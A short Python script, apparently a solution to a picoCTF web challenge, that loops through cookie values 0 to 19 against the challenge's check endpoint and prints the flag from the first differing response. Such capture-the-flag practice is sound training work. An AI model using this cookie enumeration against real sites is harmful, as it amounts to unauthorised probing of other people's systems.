import requests
import re

check_url = "http://mercury.picoctf.net:27177/check"
regex_exp = "<b>(.+?)</b>"
for count in range(20):
    cookie = {"name": str(count)}
    response = requests.get(check_url, cookies=cookie)
    matches = re.findall(pattern=re.compile(regex_exp), string=response.text)
    if "I love" not in matches[0]:
        regex_exp = "<code>(.+?)</code>"
        matches = re.findall(pattern=re.compile(regex_exp), string=response.text)
        print(matches[0])
        break